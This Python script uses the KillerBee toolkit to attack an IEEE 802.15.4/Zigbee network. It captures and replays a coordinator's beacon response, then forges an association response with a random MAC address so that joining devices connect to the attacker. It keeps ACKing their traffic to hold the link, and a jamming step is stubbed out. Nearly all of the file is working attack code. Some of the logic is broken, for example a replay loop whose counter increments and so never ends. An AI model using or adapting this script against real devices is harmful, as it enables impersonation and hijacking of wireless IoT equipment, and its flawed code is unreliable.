#!/usr/bin/env python

import argparse
import array
import sys
import time

from killerbee import *

BEACON_RESPONSE_LISTEN_TRIES = 10

# Number of channels to increment after jamming
CHANNEL_INCREMENT = 0

# Beacon request packet (captured via Wireshark)
BEACON_REQUEST_PKT_BYTES = str(bytearray([
        0x03, 0x08, 0xb0, 0xff, 0xff, 0xff, 0xff, 0x07
        ]))

# Jam time, in microseconds
JAM_TIME_SEC = 5

# Random data
JAM_PKT_BYTES = str(bytearray([
        6,38,120,91,206,116,184,22,42,239,243,204,139,78,
        83,10,226,215,183,60,86,76,181,102,219,30,87,238,
        230,244,67,26,6,223,205,159,134,62,138,121,58,4,9,
        124,31,187,18,160,119,155,64,252,0,173,49,111,154,
        166,158,21,13,108,68,112,53,240,100,214,126,72,61,
        80,98,47,198,48,231,96,248,220,92,95,8,195,185,19,
        168,190,233,122,129,101,188,210,46,85,229,144,247,
        167,123,194,193,234,74,174,147,242,255,179,197,103,
        57,152,73,5,44,63,56,141,211,202,45,224,178
        ]))

# Command line main function
if __name__ == '__main__':
    # Command-line arguments
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('-c', '--channel', action='store', dest='channel', required=True, type=int, default=11)
    parser.add_argument('-i', '--iface', '--dev', action='store', dest='devstring')
    args = parser.parse_args()

    # try-except block to catch keyboard interrupt.
    try:
        kb = KillerBee(device=args.devstring)
        kb.set_channel(args.channel)

        # Send a beacon request and get the response
        got_beacon_response = False
        beacon_response_bytes = None
        while not got_beacon_response:
            # Send request
            print('1. Sending beacon request.')
            kb.inject(BEACON_REQUEST_PKT_BYTES)

            # Get the response. If, after 10 packets, we haven't gotten a
            # response, assume the request was lost and try to resend it
            print('2. Listening for beacon response.')
            tries = BEACON_RESPONSE_LISTEN_TRIES
            kb.sniffer_on()
            while tries > 0 and not got_beacon_response:
                packet = kb.pnext()
                if packet:
                    packet_bytes = bytearray(packet['bytes'])
                    # Beacon responses have 0b000 at the end of their first byte
                    if (packet_bytes[0] & 0b111 == 0b000):
                        print('  Got beacon response!')
                        beacon_response_bytes = bytearray(packet['bytes'])
                        got_beacon_response = True
                    else:
                        print('  Ignoring packet: not beacon response.')
                    tries -= 1
                    if tries == 0:
                        print('  Failed to receive beacon response after ' + \
                                str(BEACON_RESPONSE_LISTEN_TRIES) + ' tries. Resending request...')
            kb.sniffer_off()

        # Wait for another beacon request
        print('3. Listening for a beacon request from another device...')
        got_beacon_request = False
        counter = 1
        kb.sniffer_on(args.channel)
        while not got_beacon_request:
            packet = kb.pnext()
            if packet:
                packet_bytes = bytearray(packet['bytes'])
                # Beacon requests have 0b011 at the end of their first byte
                # and 0x07 as their 7th byte
                if (packet_bytes[0] & 0b111 == 0b011 and (packet_bytes[7] == 0x07)): # or \
                        #(len(packet_bytes) > 17 and packet_bytes[17] == 0x06))):
                    print('  Got beacon request.')
                    got_beacon_request = True
                else:
                    print('  Ignoring packet (' + str(counter) + '): not beacon request.')
                    counter += 1
        kb.sniffer_off()

        #print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
        # TODO nothing here because jamming is stupidly hard

        # Change channel
        new_channel = args.channel + CHANNEL_INCREMENT
        #print('5. Changing channel from ' + str(args.channel) + ' to ' + str(new_channel) + '.')
        #kb.set_channel(new_channel)

        # Remove FCS
        beacon_response_bytes = beacon_response_bytes[:-2]

        # NOTE: Beacon requests appear to occur twice
        count = 2
        while count > 0:
            # Wait for another beacon request
            print('6. Listening for a beacon request from another device...')
            got_beacon_request = False
            kb.sniffer_on()
            br_seq_num = 0
            while not got_beacon_request:
                packet = kb.pnext()
                if packet:
                    packet_bytes = bytearray(packet['bytes'])
                    # Beacon requests have 0b011 at the end of their first byte
                    # and 0x07 as their 7th byte
                    if (packet_bytes[0] & 0b111 == 0b011 and packet_bytes[7] == 0x07):
                        print('  Got beacon request.')
                        got_beacon_request = True
            kb.sniffer_off()

            # Update timestamp
            beacon_response_bytes[2] = (beacon_response_bytes[2]+1) % 256

            # Send forged beacon response
            print('7. Replaying beacon response.')
            kb.inject(beacon_response_bytes)

            count += 1

        # Wait for association request
        print('8. Listening for association request.')
        got_assoc_request = False
        kb.sniffer_on()
        assoc_request_pkt_bytes = None
        while not got_assoc_request:
            packet = kb.pnext()
            if packet:
                packet_bytes = bytearray(packet['bytes'])
                # Beacon requests have 0b011 at the end of their first byte
                # and 0x01 as their 17th byte
                if (packet_bytes[0] & 0b111 == 0b011 and \
                        len(packet_bytes) > 17 and \
                        packet_bytes[17] == 0x01):
                    print('  Got association request.')
                    assoc_request_pkt_bytes = bytearray(packet['bytes'])
                    got_assoc_request = True
        kb.sniffer_off()

        # Construct association response
        assoc_response_seq_num = assoc_request_pkt_bytes[2]+1
        assoc_response_dest_mac = assoc_request_pkt_bytes[9:17]
        assoc_response_dest_pan = assoc_request_pkt_bytes[3:5]
        fake_mac_addr_bytes = bytearray(kbutils.randmac())
        # 1. 2 bytes of frame info and sequence number (assoc request SN + 1)
        # 2. Destination PAN (extracted from assoc request)
        # 3. Destination MAC address (extracted from assoc request)
        # 4. Our mac address
        # 5. Assoc response code, new device addr = 0x1234, assoc success
        assoc_response_pkt_bytes = bytearray([0x63, 0xcc, assoc_response_seq_num]) + \
                assoc_response_dest_pan + \
                assoc_response_dest_mac + \
                fake_mac_addr_bytes + \
                bytearray([0x02, 0x34, 0x12, 0x00])

        # Send forged association response
        print('9. Sending association response.')
        kb.inject(assoc_response_pkt_bytes)

        # ACK data requests and note when data was received
        print('10. Maintaining connection...')
        while True:
            sniffer_on = False
            packet = None
            while not packet:
                if not sniffer_on:
                    kb.sniffer_on()
                    sniffer_on = True
                    print('Sniffer on')

                packet = kb.pnext()
                if packet:
                    packet_bytes = bytearray(packet['bytes'])
                    print('Got packet: ' + str(list(packet_bytes)))
                    packet_seq_num = packet_bytes[2]
                    # Check for data requests.
                    # 1. Command header
                    # 2. Addressed to us
                    # 3. Data request
                    if packet_bytes[0:2] == bytearray([0x63, 0x88]) and \
                            packet_bytes[5:7] == bytearray([0x00, 0x00]) and \
                            packet_bytes[9] == bytearray([0x04]):
                        print('  Got data request. ACKing.')
                    # Check for data
                    elif (packet_bytes[0] & 0b111 == 0b001):
                        print('  Got data. ACKing.')

                    kb.sniffer_off()
                    sniffer_off = True
                    print('Sniffer off')

                    kb.inject(bytearray([0x02, 0x00, packet_seq_num]))

    except KeyboardInterrupt:
        print 'Shutting down'
